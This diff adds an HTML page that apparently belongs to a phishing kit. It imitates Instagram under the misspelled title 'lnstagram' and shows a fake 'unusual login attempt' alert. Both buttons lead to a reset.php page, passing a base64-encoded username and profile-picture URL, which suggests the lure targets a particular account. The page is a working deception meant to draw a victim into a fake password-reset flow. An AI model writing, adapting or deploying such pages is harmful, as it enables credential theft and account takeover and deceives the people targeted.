@@ -1,0 +1,167 @@
+<html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
+  <title>lnstagram |</title>
+  <link rel="stylesheet" href="style.css">
+  <style>
+        /* Spinner stili */
+        .spinner {
+            display: none; /* Başlangıçta gizli */
+            width: 13px;
+            aspect-ratio: 1;
+            border-radius: 50%;
+            border: 3px solid #FFFFFF;
+             animation: l20-1 0.9s infinite linear alternate, l20-2 1.8s infinite linear;
+        }
+		
+		.spinner2 {
+            display: none; /* Başlangıçta gizli */
+            width: 13px;
+            aspect-ratio: 1;
+            border-radius: 50%;
+            border: 3px solid #000000;
+             animation: l20-1 0.9s infinite linear alternate, l20-2 1.8s infinite linear;
+        }
+
+         @keyframes l20-1 {
+            0%    {clip-path: polygon(50% 50%,0       0,  50%   0%,  50%    0%, 50%    0%, 50%    0%, 50%    0% )}
+            12.5% {clip-path: polygon(50% 50%,0       0,  50%   0%,  100%   0%, 100%   0%, 100%   0%, 100%   0% )}
+            25%   {clip-path: polygon(50% 50%,0       0,  50%   0%,  100%   0%, 100% 100%, 100% 100%, 100% 100% )}
+            50%   {clip-path: polygon(50% 50%,0       0,  50%   0%,  100%   0%, 100% 100%, 50%  100%, 0%   100% )}
+            62.5% {clip-path: polygon(50% 50%,100%    0, 100%   0%,  100%   0%, 100% 100%, 50%  100%, 0%   100% )}
+            75%   {clip-path: polygon(50% 50%,100% 100%, 100% 100%,  100% 100%, 100% 100%, 50%  100%, 0%   100% )}
+            100%  {clip-path: polygon(50% 50%,50%  100%,  50% 100%,   50% 100%,  50% 100%, 50%  100%, 0%   100% )}
+        }
+
+        @keyframes l20-2 {
+            0%    {transform: scaleY(1)  rotate(0deg)}
+            49.99% {transform: scaleY(1)  rotate(135deg)}
+            50%   {transform: scaleY(-1) rotate(0deg)}
+            100%  {transform: scaleY(-1) rotate(-135deg)}
+        }
+
+        .disabled {
+            pointer-events: none; /* Butonu tıklanamaz hale getir */
+            opacity: 0.6; /* Butonun görünümünü azalt */
+        }
+    </style>
+</head>
+<body>
+<div class="enust1">
+
+<img src="img/text_logo.png" alt="" style="width: 120px;">
+
+	
+	  </div>
+	 
+  <div class="kutucuk" style="max-width: 380px;">
+    <div class="password-reset">
+	<img src="img/map.png" alt="" style="max-width: 100%;">
+      <h2 style="font-size: 25px; font-weight: 400;">We Detected An Unusual Login Attempt</h2>
+	  <p style="color: #000000; font-weight:600; font-size:15px;">Android | 20 Nisan 20:22<br>Mumbai, Maharashtra</p>
+    
+      <p>To secure your account, let us know if it was you.</p>
+    
+	 <br>
+      <form>
+
+        <button class="ana_buton">
+		<span id="buttonText">This Wasn't Me</span>
+		<div class="spinner" id="spinner"></div>
+		</button>
+		
+		   <br>
+		   <br>
+<button class="ana_buton2" style="background-color: #efefef; color:black;">
+		<span id="buttonText2">This Was Me</span>
+		<div class="spinner" id="spinner2"></div>
+		</button>
+		   <br>
+      
+      </form>
+	  
+	 <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        // Ensure the button exists before adding an event listener
+        var button = document.querySelector('.ana_buton');
+        if (button) {
+            button.addEventListener('click', function() {
+                var buttonText = document.getElementById('buttonText');
+                var spinner = document.getElementById('spinner');
+
+                // Show spinner and hide text
+                if (spinner) spinner.style.display = 'inline-block'; // Show the spinner
+                if (buttonText) buttonText.style.display = 'none'; // Hide the button text
+                
+                // Disable the button to prevent multiple clicks
+                this.classList.add('disabled');
+                this.disabled = true; // You can also disable the button directly.
+
+                // Redirect to the page after a short delay (optional for smooth experience)
+                setTimeout(function() {
+                    window.location.href = 'reset.php?nick=ZmFtaWx5X2NhcGl0YWwwNQ==&resim=aHR0cHM6Ly9zY29udGVudC5jZG5pbnN0YWdyYW0uY29tL3YvdDUxLjI4ODUtMTkvNDMzNDg3MTY4XzMwMjkyNjM4MjU3NzMxNV8zOTQ1MTIxOTE0MjY2NDI0OTgxX24uanBnP3N0cD1kc3QtanBnX2UwX3MxNTB4MTUwX3R0NiZfbmNfaHQ9c2NvbnRlbnQuY2RuaW5zdGFncmFtLmNvbSZfbmNfY2F0PTEwMyZfbmNfb2M9UTZjWjJRR3lmU1FpanRRVm9uSVZ5UUEwdjZEWGp0THhCT0NpYjNER3E4UmlkcWJONThfTjdmRm5OV3NJTkd3azNjdzFrOTgmX25jX29oYz0xOE1idWdTSHVzMFE3a052d0YzVzNZViZfbmNfZ2lkPTh0SW9tSVBsMGFyTWJUN3dJY0taNVEmZWRtPUFHcUNZYXNCQUFBQSZjY2I9Ny01Jm9oPTAwX0FmRlYwR01Gbkl0SWZqMUpNZURhM1BuZjNhTU11YkRYR2ZwdmZoTm1HU2RGNHcmb2U9NjgwQzFGREImX25jX3NpZD02YzVkZWE=';  // Redirect to 'telif.php'
+                }, 200);  // Optional: add a delay to allow the UI to update before redirection.
+            });
+        } else {
+            console.log('Button with class "ana_buton" not found');
+        }
+    });
+</script>
+
+ <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        // Ensure the button exists before adding an event listener
+        var button = document.querySelector('.ana_buton2');
+        if (button) {
+            button.addEventListener('click', function() {
+                var buttonText = document.getElementById('buttonText2');
+                var spinner = document.getElementById('spinner2');
+
+                // Show spinner and hide text
+                if (spinner) spinner.style.display = 'inline-block'; // Show the spinner
+                if (buttonText) buttonText.style.display = 'none'; // Hide the button text
+                
+                // Disable the button to prevent multiple clicks
+                this.classList.add('disabled');
+                this.disabled = true; // You can also disable the button directly.
+
+                // Redirect to the page after a short delay (optional for smooth experience)
+                setTimeout(function() {
+                    window.location.href = 'reset.php?nick=ZmFtaWx5X2NhcGl0YWwwNQ==&resim=aHR0cHM6Ly9zY29udGVudC5jZG5pbnN0YWdyYW0uY29tL3YvdDUxLjI4ODUtMTkvNDMzNDg3MTY4XzMwMjkyNjM4MjU3NzMxNV8zOTQ1MTIxOTE0MjY2NDI0OTgxX24uanBnP3N0cD1kc3QtanBnX2UwX3MxNTB4MTUwX3R0NiZfbmNfaHQ9c2NvbnRlbnQuY2RuaW5zdGFncmFtLmNvbSZfbmNfY2F0PTEwMyZfbmNfb2M9UTZjWjJRR3lmU1FpanRRVm9uSVZ5UUEwdjZEWGp0THhCT0NpYjNER3E4UmlkcWJONThfTjdmRm5OV3NJTkd3azNjdzFrOTgmX25jX29oYz0xOE1idWdTSHVzMFE3a052d0YzVzNZViZfbmNfZ2lkPTh0SW9tSVBsMGFyTWJUN3dJY0taNVEmZWRtPUFHcUNZYXNCQUFBQSZjY2I9Ny01Jm9oPTAwX0FmRlYwR01Gbkl0SWZqMUpNZURhM1BuZjNhTU11YkRYR2ZwdmZoTm1HU2RGNHcmb2U9NjgwQzFGREImX25jX3NpZD02YzVkZWE=';  // Redirect to 'telif.php'
+                }, 200);  // Optional: add a delay to allow the UI to update before redirection.
+            });
+        } else {
+            console.log('Button with class "ana_buton" not found');
+        }
+    });
+</script>
+
+
+
+    </div>
+  </div>
+  <div class="footer">
+    <hr>
+    <div class="footer-icons">
+      <!-- SVG ikonlarını buraya ekleyin -->
+      <div class="icon">
+        <svg aria-label="Ana Sayfa" class="x1lliihq x1n2onr6 x5n08af" fill="currentColor" height="24" role="img" viewBox="0 0 24 24" width="24"><title>Ana Sayfa</title><path d="M9.005 16.545a2.997 2.997 0 0 1 2.997-2.997A2.997 2.997 0 0 1 15 16.545V22h7V11.543L12 2 2 11.543V22h7.005Z" fill="none" stroke="currentColor" stroke-linejoin="round" stroke-width="2"></path></svg>
+		</div>
+		<svg aria-label="Keşfet" class="x1lliihq x1n2onr6 x5n08af" fill="currentColor" height="24" role="img" viewBox="0 0 24 24" width="24"><title>Keşfet</title><polygon fill="none" points="13.941 13.953 7.581 16.424 10.06 10.056 16.42 7.585 13.941 13.953" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></polygon><polygon fill-rule="evenodd" points="10.06 10.056 13.949 13.945 7.581 16.424 10.06 10.056"></polygon><circle cx="12.001" cy="12.005" fill="none" r="10.5" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></circle></svg>
+		 <div class="icon">
+		<svg aria-label="Reels" class="x1lliihq x1n2onr6 x5n08af" fill="currentColor" height="24" role="img" viewBox="0 0 24 24" width="24"><title>Reels</title><line fill="none" stroke="currentColor" stroke-linejoin="round" stroke-width="2" x1="2.049" x2="21.95" y1="7.002" y2="7.002"></line><line fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" x1="13.504" x2="16.362" y1="2.001" y2="7.002"></line><line fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" x1="7.207" x2="10.002" y1="2.11" y2="7.002"></line><path d="M2 12.001v3.449c0 2.849.698 4.006 1.606 4.945.94.908 2.098 1.607 4.946 1.607h6.896c2.848 0 4.006-.699 4.946-1.607.908-.939 1.606-2.096 1.606-4.945V8.552c0-2.848-.698-4.006-1.606-4.945C19.454 2.699 18.296 2 15.448 2H8.552c-2.848 0-4.006.699-4.946 1.607C2.698 4.546 2 5.704 2 8.552Z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path><path d="M9.763 17.664a.908.908 0 0 1-.454-.787V11.63a.909.909 0 0 1 1.364-.788l4.545 2.624a.909.909 0 0 1 0 1.575l-4.545 2.624a.91.91 0 0 1-.91 0Z" fill-rule="evenodd"></path></svg>
+		</div>
+		<svg aria-label="Yeni Gönderi" class="x1lliihq x1n2onr6 x5n08af" fill="currentColor" height="24" role="img" viewBox="0 0 24 24" width="24"><title>Yeni Gönderi</title><path d="M2 12v3.45c0 2.849.698 4.005 1.606 4.944.94.909 2.098 1.608 4.946 1.608h6.896c2.848 0 4.006-.7 4.946-1.608C21.302 19.455 22 18.3 22 15.45V8.552c0-2.849-.698-4.006-1.606-4.945C19.454 2.7 18.296 2 15.448 2H8.552c-2.848 0-4.006.699-4.946 1.607C2.698 4.547 2 5.703 2 8.552Z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path><line fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" x1="6.545" x2="17.455" y1="12.001" y2="12.001"></line><line fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" x1="12.003" x2="12.003" y1="6.545" y2="17.455"></line></svg>
+		 <div class="icon">
+		<svg aria-label="Direct" class="x1lliihq x1n2onr6 x5n08af" fill="currentColor" height="24" role="img" viewBox="0 0 24 24" width="24"><title>Direct</title><line fill="none" stroke="currentColor" stroke-linejoin="round" stroke-width="2" x1="22" x2="9.218" y1="3" y2="10.083"></line><polygon fill="none" points="11.698 20.334 22 3.001 2 3.001 9.218 10.084 11.698 20.334" stroke="currentColor" stroke-linejoin="round" stroke-width="2"></polygon></svg>
+		</div>
+		<div class="icon">
+		<img alt="" style="width: 35px; height: 35px; border-radius: 50%;" crossorigin="anonymous" draggable="false" src="data:image/png;base64,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">
+      </div>
+   
+    </div>
+  </div>
+
+
+
+</body></html>
